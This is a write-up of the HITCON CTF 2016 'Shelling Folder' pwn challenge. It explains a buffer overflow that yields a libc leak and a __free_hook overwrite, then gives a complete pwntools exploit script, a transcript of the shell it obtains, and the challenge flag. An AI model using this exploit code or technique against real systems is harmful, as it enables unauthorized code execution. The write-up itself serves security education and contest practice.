---
title: HITCON CTF 2016 Quals -- Shelling Folder
layout: single
comments: true
share: true
related: true
author_profile: true
permalink: "/:title/"
tags:
- CTF
- HITCON
- BOF
- Pwnable
- heap
- Python
categories:
- write-ups
date: '2016-10-10 16:11:00 +0000'
---

**Category:** pwn
**Points:** 200

<!-- more -->  

64 bit ELF, with all the protection enabled.  

The program is a simple file system. You can create or delete files and folders, list files in a folder, change the current folder and calculate the size of a folder.  

It's a unix-like file system, where folders are also a special type of file. Both folders and files are stored in the program with the following data structure:
```c
struct file{
    struct file *sub_file[10]; // will all be null if it's a normal file
    struct file *parent_folder;
    char name[32];
    long file_size;
    int is_dir;
}
```
If a folder is created, the `is_dir` flag will be set to `1`, and the `file_size` will be set to `0`. A folder is allowed to contain at most 10 `sub_file`. If a normal file is created ( not folder ), the `is_dir` flag will be set to `0`, and the value of `file_size` is set by user. 

There's a **buffer overflow vulnerability** in the function of calculating the folder size:
```c
void cal_folder_size(struct file *cur_folder)
{
    char s; // [sp+10h] [bp-30h]@3
    __int64 *v3; // [sp+28h] [bp-18h]@5
    int idx; // [sp+30h] [bp-10h]@3

    if ( !cur_folder )
        exit(1);
    idx = 0;
    memset(&s, 0, 0x20uLL);

    while ( idx <= 9 )
    {
        if ( cur_folder->sub_file[idx] )
        {
            v3 = &cur_folder->file_size;
            copy_file_name(&s, cur_folder->sub_file[idx]->name); // <-- here we have a buffer overflow vulnerability
            if ( cur_folder->sub_file[idx]->is_dir == 1 )
            {
                *v3 = *v3;
            }
            else
            {
                printf("%s : size %ld\n", &s, cur_folder->sub_file[idx]->file_size);
                *v3 += cur_folder->sub_file[idx]->file_size;
            }
        }
        ++idx;
    }
    printf("The size of the folder is %ld\n", cur_folder->file_size);

}
```
When we set a file's name, we can input at most 31 characters. Inside the `cal_folder_size` function, the program will try to copy the file's name into a buffer `s`, which its size is only 24 bytes long. The vulnerability will cause the program to overwrite the `v3` variable.

The `v3` variable is an `int*` type pointer, which points to the current folder's `file_size`. Since we can overwrite this pointer, we can try to control this pointer and the size of the `sub_file[idx]`, so when the program execute the code at line:
```c
*v3 += cur_folder->sub_file[idx]->file_size
```
**it will actually let us control the value of any address.**

But remember the program has all the protection enabled, including **PIE**, so first we'll have to leak some address. Here's how I leak the address of the libc:

1. Create & delete some folders, so the pointer that points to the head of smallbin will appear on the heap memory.
2. Exploit the buffer overflow vulnerability, partial overwrite the `v3` pointer and make it point to a `struct file` pointer `p` ( `*v3 = p`).  
3. Control a `sub_file`'s `file_size`, so when it comes to the line `*v3 += cur_folder->sub_file[idx]->file_size`, it will adjust the value of `p`, making `p->name` point to the libc's address ( address of the smallbin's head )
4. List the files in the current folder and leak the libc's address.

After we got the libc's address, we can use the same vulnerability to overwrite the `__free_hook` function pointer into the address of **one gadget**, and get the shell by deleting a file. Notice that `file_size` stores the value returned by `atoi`, a four-byte integer, so we'll have to overwrite `__free_hook` twice : first  overwrite `__free_hook`,  then overwrite `__free_hook+4`.

```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "52.69.237.212"
#HOST = "127.0.0.1"
PORT = 4869
ELF_PATH = "./shellingfolder_noalarm"
#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
LIBC_PATH = "./libc.so.6"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def str_addr(s, f): # search string address in file
    result = list(f.search(s+"\x00"))
    if not len(result): # no result
        return None
    else:
        return result[0]

def create_file(name, size):
    r.sendlineafter(":", "4")
    r.sendafter(":", name)
    r.sendlineafter(":", str(size))

def change_dir(name):
    r.sendlineafter(":", "2")
    r.sendafter(":", name)

def remove(name):
    r.sendlineafter(":", "5")
    r.sendafter(":", name)

def make_dir(name):
    r.sendlineafter(":", "3")
    r.sendafter(":", name)

def ls():
    r.sendlineafter(":", "1")

def cal():
    r.sendlineafter(":", "6")

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    # overwrite &file->fize_size (address of file_size)
    # use cal() to let file->name point to main_arena+88
    make_dir("AAAA")
    make_dir("BBBB")
    make_dir("CCCC")
    create_file("F"*24+p8(0x10), 64)
    remove("BBBB\n")
    remove("CCCC\n")
    cal()
    ls()

    # leak libc address
    ######################## one gadget
    # .text:000000000004525A                 mov     rax, cs:environ_ptr_0
    # .text:0000000000045261                 lea     rdi, aBinSh     ; "/bin/sh"
    # .text:0000000000045268                 lea     rsi, [rsp+188h+var_158]
    # .text:000000000004526D                 mov     cs:dword_3C54A0, 0
    # .text:0000000000045277                 mov     cs:dword_3C54A4, 0
    # .text:0000000000045281                 mov     rdx, [rax]
    # .text:0000000000045284                 call    execve
    ##########################
    r.recvuntil("----------------------\n")
    libc.address += u64(r.recv(6).ljust(8, "\x00")) - 0x3c3b78
    one_gadget = libc.address + 0x4525a
    malloc_hook = libc.symbols['__malloc_hook']
    free_hook = libc.symbols['__free_hook']
    log.success("libc_base: "+hex(libc.address))
    log.success("one_gadget: "+hex(one_gadget))
    log.success("malloc_hook: "+hex(malloc_hook))
    log.success("free_hook: "+hex(free_hook))

    # overwrite free_hook to one_gadet
    make_dir("DDDD")
    change_dir("DDDD\n")
    create_file("i"*24+p64(free_hook)[:7:], (one_gadget & 0xffffffff))
    create_file("I"*24+p64(free_hook+4)[:7:], ((one_gadget & 0xffffffff00000000)>>32))
    cal()
    # get shell
    remove("i"*24+p64(free_hook)[:7:])
    
    r.interactive()
```

```
[x] Opening connection to 52.69.237.212 on port 4869
[x] Opening connection to 52.69.237.212 on port 4869: Trying 52.69.237.212
[+] Opening connection to 52.69.237.212 on port 4869: Done
[+] libc_base: 0x7ff15c7cc000
[+] one_gadget: 0x7ff15c81125a
[+] malloc_hook: 0x7ff15cb8fb10
[+] free_hook: 0x7ff15cb917a8
[*] Switching to interactive mode
 size 32753
The size of the folder is 0
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:Choose a Folder or file :

// id
uid=1000(shellingfolder) gid=1000(shellingfolder) groups=1000(shellingfolder)

// cat /home/shellingfolder/flag
hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
``` 

flag: `hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}`